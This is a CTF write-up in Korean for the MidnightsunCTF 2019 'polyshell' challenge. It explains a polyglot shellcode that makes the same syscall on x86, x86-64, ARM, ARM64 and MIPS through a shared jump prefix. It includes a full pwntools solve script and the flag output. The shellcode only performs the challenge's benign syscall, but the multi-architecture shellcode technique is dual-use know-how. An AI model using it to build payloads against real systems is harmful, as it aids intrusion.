---
layout:     post
title:      "MidnightsunCTF 2019 polyshell WriteUp"
subtitle:   "MidnightsunCTF 2019 pwnable"
date:       2019-08-07
author:     "NextLine"
header-img: "img/post-bg-3.png"
tags:
    - WriteUp
---

# MidnightsunCTF 2019 polyshell WriteUp

### 1. Intro

DEFCON의 doublethink와 비슷하게 하나의 쉘코드로 5개의 아키텍쳐에서 같은 로직을 실행하도록 짜야했다.


### 2. Solve

```
youngjoo@ubuntu1804 # ~$ nc polyshell-01.play.midnightsunctf.se 30000

Welcome to the polyglot challenge!
Your task is to create a shellcode that can run on the following architectures:
x86
x86-64
ARM
ARM64
MIPS-LE

The shellcode must run within 1 second(s) and may run for at most 100000 cycles.
The code must perform a syscall on each platform according to the following paramters:
Syscall number: 205
Argument 1: 39360
Argument 2: A pointer to the string "locate"

You submit your code as a hex encoded string of max 4096 characters (2048 bytes)

Your shellcode:
```

위와 같이 특정 argument를 가진 syscall을 5개의 아키텍쳐에서 실행해야 했다.

```
sc = '\xeb\x13\x00\x32'
sc += '\x0e\x00\x10\x12'
sc += '\x00\x00\x00\x32'
sc += '\x19\x00\x00\xea'
sc += '\x22\x00\x00\x14'
```
쉘코드에서 가장 핵심적인 내용은 위와 같은 jump문이다.

- x86, x64
```
   0:   eb 13                   jmp    0x15
   2:   00 32                   add    BYTE PTR [edx],dh
   4:   0e                      push   cs
   5:   00 10                   add    BYTE PTR [eax],dl
   7:   12 00                   adc    al,BYTE PTR [eax]
   9:   00 00                   add    BYTE PTR [eax],al
   b:   32 19                   xor    bl,BYTE PTR [ecx]
```

- mips
```
   0:   320013eb        andi    zero,s0,0x13eb
   4:   1210000e        beq     s0,s0,0x40
   8:   32000000        andi    zero,s0,0x0
   c:   ea000019        swc2    $0,25(s0)
  10:   14000022        bnez    zero,0x9c
  14:   90909090        lbu     s0,-28528(a0)
```

- arm
```
   0:   320013eb        andcc   r1, r0, #-1409286141    ; 0xac000003
   4:   1210000e        andsne  r0, r0, #14
   8:   32000000        andcc   r0, r0, #0
   c:   ea000019        b       0x78
  10:   14000022        strne   r0, [r0], #-34  ; 0xffffffde
  14:   90909090        umullsls        r9, r0, r0, r0
```

- arm64
```
   0:   320013eb        orr     w11, wzr, #0x1f
   4:   1210000e        and     w14, w0, #0x10000
   8:   32000000        orr     w0, w0, #0x1
   c:   ea000019        ands    x25, x0, x0
  10:   14000022        b       0x98
  14:   90909090        adrp    x16, 0xffffffff21210000
  18:   6c63be90        ldnp    d16, d15, [x20, #-456]
```

쉘코드를 짤 때 주의해야할 점은 mips 분기문에서 jump 인스트럭션 이후에 하나의 인스트럭션을 더 실행해야 점프한다는 점이다.

```python
from pwn import *
s = remote('polyshell-01.play.midnightsunctf.se', 30000)
s.recvuntil('number: ')
syscall = int(s.recvline())
s.recvuntil('1: ')
argv1 = int(s.recvline())
s.recvuntil('string "')
argv2 = s.recvline()[:-2].ljust(8,'\x00')
s.info("syscall : " + str(syscall))
s.info("argv1 : " + str(argv1))
s.info("argv2 : " + argv2)
#syscall = 43
#argv1 = 5382
#argv2 = 'molecule'
sc = '\xeb\x13\x00\x32'
sc += '\x0e\x00\x10\x12' # beq     s0,s0,0x4
sc += '\x00\x00\x00\x32'
sc += '\x19\x00\x00\xea'
sc += '\x22\x00\x00\x14'
argv2str = str(argv2)
argv2_2 = [u16(argv2[:2]),u16(argv2[2:4]),u16(argv2[4:6]),u16(argv2[6:8])]
argv2_1 = u64(argv2)
argv2 = [u32(argv2[:4]), u32(argv2[4:])]
print "---- i386 ----"
print "---- amd64 ----"
context.arch = 'i386'
sc += asm('nop') * 0x5
sc += asm('mov esi, %d' % argv2[0])
sc += asm('mov edi, %d' % argv2[1])
sc += asm('mov DWORD PTR [esp-0x4],edi')
sc += asm('mov DWORD PTR [esp-0x8],esi')
sc += asm('sub esp, 0x8')
sc += asm('mov ecx, esp')
sc += asm('mov ebx, %d' % argv1)
sc += asm('mov esi, ecx')
sc += asm('mov edi, ebx')
sc += asm('mov al, %d' % syscall)
sc += asm('syscall')
print disasm(sc)
print "---- mips ----"
context.arch = 'mips'
sc += 'A' * 0x7
sc += asm('slti $a2, $zero, -1')
sc += asm('slti $a1, $zero, -1')
sc += asm('slti $a0, $zero, -1')
sc += asm('li $t7, %d' % argv2[0])
sc += asm('sw $t7, -12($sp)')
sc += asm('li $t6, %d' % argv2[1])
sc += asm('sw $t6, -8($sp)')
sc += asm('sw $zero, -4($sp)')
sc += asm('li $a0, %d' % argv1)
sc += asm('la $a1, -12($sp)')
sc += asm('li $v0, %d' % syscall)
sc += asm('syscall')
#debug()
print disasm(sc)
#a = gdb.debug_shellcode(sc)
print "---- arm ----"
context.arch = 'arm'
sc += asm('''
add  r3, pc, #1
bx   r3
.thumb
mov  r1, pc
adds r1, #12
mov  r0, #%d
mov  r7, #%d
svc 1
''' % (argv1, syscall))
sc += argv2str
print disasm(sc)
print "---- arm64 ----"
context.arch = 'arm64'
sc += asm('adr x1, 0x10')
sc += asm('mov x0, %d' % argv1)
sc += asm('mov x8, %d' % syscall)
sc += asm('svc #0x0')
sc += argv2str
print disasm(sc)
s.sendline(sc.encode('hex'))
s.interactive()
```

```
You submit your code as a hex encoded string of max 4096 characters (2048 bytes)

Your shellcode: Results:
x86: Success
x86-64: Success
ARM: Success
ARM64: Success
MIPS: Success

Congratulations! Here is your flag: midnight{Its_shellz_all_the_w4y_d0wn}
```
